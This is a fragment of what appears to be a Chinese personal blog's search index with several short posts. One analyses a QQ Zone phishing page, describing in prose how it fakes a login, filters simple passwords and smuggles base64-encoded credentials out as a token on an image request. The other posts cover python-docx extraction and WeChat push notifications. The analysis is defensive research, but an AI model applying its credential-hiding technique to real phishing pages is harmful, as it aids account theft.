数据挖掘 微信小程序开发 前端尝个鲜 视频制作 etc. 其实就是啥都想玩一玩，感觉能做的就去尝试尝试，特别是那种接近实际的。于是乎就想写啥就写啥呗。不过基本上以小想法为主，就是随便记录一下这样吧。 好啦第一篇就这样随便写写了。溜啦溜啦~","path":"2019/07/09/FirstBlog/"},{"title":"小想法 | 某QQ空间盗号页面分析","text":"搬运自之前的小脑洞小想法啦 起因昨晚有个小伙伴空间里把列表都at了（后来知道的），附带P1这张图。 然后感觉不对劲，肯定是被盗号了。 然后突然有个脑洞，去看看这里面有啥吧 折腾记录用扫码工具（千万别拿QQ来扫，虽然这次的链接没啥大影响）得到二维码文字内容，发现是类似url.cn/...的短链接。 用电脑浏览器打开，同时打开调试窗口，发现短链接跳转到一个Github.io的页面（P3），很明显是GitHub Pages。 于是去GitHub上查找该用户，发现只有个项目，里面就只有一个index.html文件，对应着P2页面，最新版本还是昨天提交的（P4）。 感觉不对，于是改变 User Agent 为手机，重新访问短链接，跳转P5页面，是个伪QQ空间登录界面，果然是个钓鱼页面233。 点击一键登录，延时一会儿会提示 请安装最新版本QQ 。【忘了密码】及【注册新账号】都是跳转到QQ官方的页面。然后输个123456789啥的测试一下，还会提示 请输入正确账号或者密码 啥的（P6）。 乱输一个987321654，噫进去了，跳转到了真的QQ空间，虽然并没有真的登录（P7）。 而后在调试窗口network下找了半天，都没发现我提交的账号密码。（P8-9） 顺着remote address查，发现唯一有可能的就是那个user.jpg，还带token参数，隐藏得有点意思，虽然不知道为啥404了。 jio得还没完，这token咋来的，提交的账号密码去哪了emmm，缺点啥。然后查看网页元素，找到了对应的JavaScript代码（P10-11）。 哈哈哈哈哈这个逻辑判断写的还是有点意思的，还把一堆常用简单数字给处理了，难怪前面输123456789玩不来。这个一键登录就是个假的（万一真的估计就得不到账号密码了吧）。点击登录的时候，将用户名密码拼接成json字符串，然后将字符串转换成base64加密传输，而后跳转到官方QQ空间界面。将P9的token用base64解密，果然得到了账号密码（P12）。 // 他没调用官方登录接口，没有真的登录到QQ空间已经很友好了，不然更难发现呢 到这差不多了，但感觉还没完，我们再来查查这个域名吧。 P13-15注册者信息，这人注册的域名真多。 用邮箱查询，而后随便访问几个，P16发现都重定向到了一个相似页面，原来那是西部数码上的一个域名经销商。这么说那个人也只是从经销商那里买了个域名而已。 总结这是个做得有点水平的钓鱼网站。 碰到类似的二维码别乱扫，扫了也别登录！ 至于获取账号密码之后把全列表都at，估计还写了别的脚本或者调用了啥接口，这个我还不清楚emmm 以上内容均基于公开资料，仅供学习研究使用，请勿用于非法用途。","path":"2019/03/30/Idea_AnalysisOfHackingPage/"},{"title":"小想法 | 利用python-docx批量提取Word中的信息进而导入Excel","text":"搬运自之前的小脑洞小想法啦 又是个小脑洞最近有个比赛要统计一下各组信息，信息来自Word版的申请表。 考虑到Word要一个一个打开，再复制粘贴。 简单重复，太难受了8，不如干脆py一下，写个小程序来弄吧。 大致思路一查发现.docx是以类似xml格式来存放信息的，刚开始思路就想直接解压.docx，从中解析文件然后暴力匹配。。 而后发现有个**第三方库python-docx**，于是乎不想造轮子了，直接拿来用吧。 然而并没有那么简单，合并的单元格变成独立重复的内容，加个去重吧。 提取信息文字都解析出来了，接下来，来点简单的正则匹配，单独拿个文件来试试，没毛病，挺好的。 批量读取遍历文件夹下所有文件，筛选.docx且排除临时文件，噫少了俩。 原来还有.doc格式的，另存为.docx *(docx库只支持.docx)*。 依次读取每个文件，拼接string列表，得到所需信息。 写入文件将infolist按照.csv的格式写入文件。 其实可以调用第三方库来实现的。 debug实际情况还是挺复杂的，比如表格哪里没填空缺了，或者哪个里面多加几个分隔符什么的，还是出了不少bug，于是继续完善程序，加入相应的处理呗！ 生产环境真复杂 如果用Excel打开.csv，发现学号前的0自动丢失，还是觉得不爽emmm （程序猿的自我修养 又查了查资料，新建.xlsx，从文本导入到Excel，设置好属性。 几好，完事！ 于是乎边查资料边debug边改代码 花了一个多两个小时估计几个人同时手动做早都做完了 （其实早就想过用py读取Excel了，但是一直还没试过，这次就先拿py读取Word试试水吧","path":"2019/03/21/Idea_python-docx/"},{"title":"小想法 | 基于PushBear API实现微信消息推送","text":"搬运自之前的小想法啦~ 调用API基于PushBear API实现微信消息提醒 PushBear API 用requests里现成的方法就完事了。 tkinter GUI就是直接写代码感觉有点不友好 于是想做个图形界面 基于Python GUI库tkinter简单做了一下 （代码手动写布局太难受了（还是直接用代码POST/GET方便emmm（突然jio得LabVIEW做图形界面真方便 微信推送效果 打开后是Markdown渲染的效果呢！ （完） 20191221 Update： 好久没用了不知道现在还能不能用了233 20200211 Update: ⚠️ 直发服务转代发的通知（重要）因多次被恶意举报，从2019年6月开始，只提供「已经微信认证后的服务号」进行授权后，用其自有接口权限代发。代发授权和绑定教程 最近弄微信消息提醒又来看了看，发现一对多的推送必须要绑定已认证的服务号才能使用了。 但是Server酱的给自己绑定的微信号推送消息还是有效的。 详见：https://sc.ftqq.com/","path":"2019/03/07/Idea_PushBearAPI_WeChatPush/"}],"categories":[],"tags":[]}